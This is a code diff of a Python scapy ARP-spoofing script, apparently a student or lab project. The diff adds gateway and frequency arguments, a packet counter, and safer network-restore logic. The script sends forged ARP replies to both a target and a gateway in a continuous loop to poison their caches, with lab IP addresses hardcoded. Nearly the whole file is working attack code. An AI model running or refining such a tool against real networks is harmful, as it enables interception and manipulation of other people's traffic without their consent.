@@ -3,7 +3,7 @@ from scapy.layers.l2 import ARP, Ether
 import time
 import argparse
 
-
+# AI gebruikt voor optimalisatie en correctie van de code + zelf verbeteringen geïmplementeerd gebruik makend van de ARP-spoofer code van: https://github.com/mirawara/arp-spoofer/blob/main/arp-spoofer.py.
 class Spoofing:
 
     def __init__(self):
@@ -13,8 +13,9 @@ class Spoofing:
 
     def set_args(self):
         self._parser = argparse.ArgumentParser()
-        self._parser.add_argument('-t', '--target', dest='_target_ip', help='Target IP Address/Adresses')
-        self._parser.add_argument('-m', '--MAC-address', dest='MAC_address', help='MAC-adress of the user')
+        self._parser.add_argument('-t', '--target', dest='target IP', help='Target IP Address/Adresses', required=False)
+        self._parser.add_argument('-g', '--gateway', dest='gateway IP', help='Gateway IP', required=False)  # Set required on True for terminal necessity.
+        self._parser.add_argument('-f', '--frequency', dest='frequency', help='Number of seconds to wait before retrying the spoof operation.', required=False)
 
     def get_args(self):
         # Check for errors i.e. if the user does not specify the target IP Address
@@ -57,7 +58,8 @@ class Spoofing:
         if answered_list:
             return answered_list[0][1].hwsrc
         else:
-            print("weinig antwoord")
+            print(f"No response for IP: {ip}")
+            return None
 
     def spoof(self):
         """
@@ -77,8 +79,8 @@ class Spoofing:
         # Setup ARP cache poisoning packet (op = operation {2 = reply}, pdst = protocol destination {target_ip}, hwdst = hardware source, psrc = protocol source {gateway_ip}).
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         send(packet, verbose=False)
-        print("The victim is Skibidi-spoofed.")
-        return
+        print("Skibidi")
+        #return
 
     def restore(self):
         """
@@ -86,15 +88,16 @@ class Spoofing:
         """
         # Initialize.
         target_ip = self._target_ip
-        spoof_ip = self._gateway_ip
+        spoof_ip  = self._gateway_ip
 
         # Get physical adresses.
         target_mac = self.get_mac(target_ip)
         spoof_mac = self.get_mac(spoof_ip)
 
         # Setup a reverse ARP cache poisoning packet.
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
-        send(packet, count=4, verbose=False)
+        if target_mac and spoof_mac:
+            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+            send(packet, count=4, verbose=False)
 
 
 def main():
@@ -106,8 +109,17 @@ def main():
     #target_ip = input("VICTIM_IP: ")
     #gateway_ip = input("GATEWAY_IP: ")
 
-    target_ip = '192.168.3.100'
-    gateway_ip = '192.168.3.104'
+    '''
+    # Get IP information with parser.
+    args = spoof.get_args()
+    target_ip = args.target
+    gateway_ip = args.gateway
+    frequency = args.frequency
+    '''
+
+    target_ip = '192.168.3.102'
+    gateway_ip = '192.168.3.106'
+    frequency = 2
 
     def ip_setup(target_ip, gateway_ip):
         spoof.set_target_ip(target_ip)
@@ -116,18 +128,26 @@ def main():
     # Use keyboard interruption to stop the ARP spoofing.
     try:
         print("Starting ARP spoofing. Press Ctrl+C to stop...")
+        sent_packets_count = 0
         while True:
             ip_setup(target_ip, gateway_ip)
             spoof.spoof()
             ip_setup(gateway_ip, target_ip)
             spoof.spoof()
-            time.sleep(2)
+            sent_packets_count += 2
+            print("\r[*] Packets sent: " + str(sent_packets_count), end="")
+            if frequency:
+                n = int(frequency)
+            else:
+                n = 2
+            time.sleep(n)
 
     except KeyboardInterrupt:
+        print()
         print("Stopping ARP spoofing and restoring network...")
-        ip_setup(target_ip, gateway_ip)
-        spoof.restore()
         ip_setup(gateway_ip, target_ip)
+        spoof.restore()
+        ip_setup(target_ip, gateway_ip)
         spoof.restore()
         print("Network restored.")
 
